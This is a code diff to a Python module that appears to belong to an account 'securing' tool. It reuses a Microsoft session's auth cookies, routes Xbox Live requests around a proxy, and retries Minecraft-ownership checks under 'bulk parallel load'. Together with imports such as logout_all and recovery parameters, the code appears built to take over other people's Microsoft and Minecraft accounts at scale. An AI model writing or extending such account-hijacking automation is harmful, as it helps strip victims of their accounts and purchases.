@@ -22,6 +22,7 @@ from securing.utils.cookies.get_cookies import get_cookies
 from securing.utils.cookies.get_amrp import get_amrp
 from securing.utils.cookies.get_amc import get_amc
 from securing.utils.cookies.get_t import get_t
+from securing.utils.cookies.safe_cookies import iter_cookies
 
 from securing.utils.security.logout_all import logout_all
 
@@ -42,17 +43,56 @@ import logging
 
 log = logging.getLogger(__name__)
 
+MC_CHECK_FAILED_LABEL = "Unknown (MC check failed)"
+
+
+def _copy_cookies(src: httpx.AsyncClient) -> httpx.Cookies:
+    """Copy auth cookies into a new jar (avoids sharing the proxied transport)."""
+    jar = httpx.Cookies()
+    for c in iter_cookies(src):
+        try:
+            jar.set(c.name, c.value, domain=c.domain or None, path=c.path or "/")
+        except Exception:
+            jar.set(c.name, c.value)
+    return jar
+
+
+async def _direct_xbl_client(session: httpx.AsyncClient) -> httpx.AsyncClient:
+    """Non-proxied client for Xbox/Minecraft SSO — proxy often kills sisu.xboxlive.com."""
+    headers = {
+        "User-Agent": session.headers.get(
+            "User-Agent",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+            "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+        ),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    }
+    return httpx.AsyncClient(
+        cookies=_copy_cookies(session),
+        headers=headers,
+        timeout=httpx.Timeout(45.0, connect=20.0),
+        follow_redirects=False,
+        # Explicit: never inherit the secure session's proxy
+        proxy=None,
+        http2=False,
+    )
+
 
 async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> str:
     """Populate account_info['minecraft']. Returns outcome:
     'ok' | 'no_java' | 'no_mc' | 'transient'
     """
-    print("[~] - Checking Minecraft Account")
-    XBLResponse = await get_xbl(session)
+    print("[~] - Checking Minecraft Account (XBL via direct connection)")
+    xbl_client = await _direct_xbl_client(session)
+    try:
+        XBLResponse = await get_xbl(xbl_client)
+    finally:
+        await xbl_client.aclose()
 
     if not XBLResponse:
-        print("[x] - Failed to get XBL (retryable / no Xbox profile)")
-        account_info["minecraft"]["name"] = "No Minecraft"
+        print("[x] - Failed to get XBL (network/auth race — NOT marking as no MC)")
+        account_info["minecraft"]["name"] = MC_CHECK_FAILED_LABEL
+        account_info["minecraft"]["method"] = "Unknown (MC check failed)"
         return "transient"
 
     print("[+] - Got XBL (Has Xbox Profile)")
@@ -64,8 +104,12 @@ async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> st
     ssid = await get_ssid(xbl)
     if not ssid:
         # XBL worked but SSID failed — often rate-limit / auth race, not "no MC"
-        print("[x] - Failed to get SSID (retryable)")
-        account_info["minecraft"]["name"] = "No Minecraft"
+        print("[x] - Failed to get SSID (retryable — NOT marking as no MC)")
+        if gtg:
+            account_info["minecraft"]["name"] = f"{gtg} (MC check failed)"
+        else:
+            account_info["minecraft"]["name"] = MC_CHECK_FAILED_LABEL
+        account_info["minecraft"]["method"] = "Unknown (MC check failed)"
         return "transient"
 
     print("[+] - Got SSID! (Has Minecraft)")
@@ -127,25 +171,46 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
         print(f"[X] - get_amc failed: {exc}")
         raise
 
-    apicanary = await get_cookies(session) 
-    
-    t = await get_t(session)
-    print(f"[+] - Got T ({t})")
+    apicanary = await get_cookies(session)
 
-    # Minecraft checking — retry when XBL/SSID fail (rate limit / parse race)
+    try:
+        t = await get_t(session)
+        if t:
+            await get_amrp(session, t)
+            print(f"[+] - Got T / AMRP")
+        else:
+            print("[!] - No classic login t token (already signed in) — skipping AMRP")
+    except Exception as exc:
+        log.warning("get_t/amrp failed — continuing with existing session: %s", exc)
+        print(f"[!] - get_t/AMRP skipped ({exc.__class__.__name__}) — continuing")
+
+
+    # Minecraft checking — retry when XBL/SSID fail (rate limit / parse race).
+    # Never label transient failures as "No Minecraft" — that was a false negative
+    # when VaultProxies killed sisu.xboxlive.com connections.
     mc_attempts = 3
     for attempt in range(1, mc_attempts + 1):
         outcome = await _check_minecraft(session, account_info)
         if outcome != "transient":
             break
         if attempt < mc_attempts:
-            delay = 3.0 * attempt
+            # 429 from login_with_xbox needs longer gaps under bulk parallel load
+            delay = 8.0 * attempt
             print(f"[~] - MC check inconclusive (attempt {attempt}/{mc_attempts}), retrying in {delay:.0f}s...")
             log.warning("MC check transient failure attempt %s/%s — sleeping %.1fs", attempt, mc_attempts, delay)
             await asyncio.sleep(delay)
         else:
-            print("[x] - MC check still failed after retries — marking No Minecraft")
-            account_info["minecraft"]["name"] = "No Minecraft"
+            print(f"[x] - MC check still failed after retries — keeping '{account_info['minecraft'].get('name')}'")
+            if account_info["minecraft"].get("name") in (None, "", "No Minecraft"):
+                account_info["minecraft"]["name"] = MC_CHECK_FAILED_LABEL
+            if account_info["minecraft"].get("method") in (None, "", "Not purchased"):
+                account_info["minecraft"]["method"] = "Unknown (MC check failed)"
+            log.error(
+                "MC check failed after %s attempts for %s (gamertag=%s) — NOT confirming no MC",
+                mc_attempts,
+                account_info.get("microsoft", {}).get("email"),
+                account_info["minecraft"].get("gamertag"),
+            )
 
     # Gets account info via microsofts API
     subscriptions = await get_subscriptions(session, verification_tokens["home"])
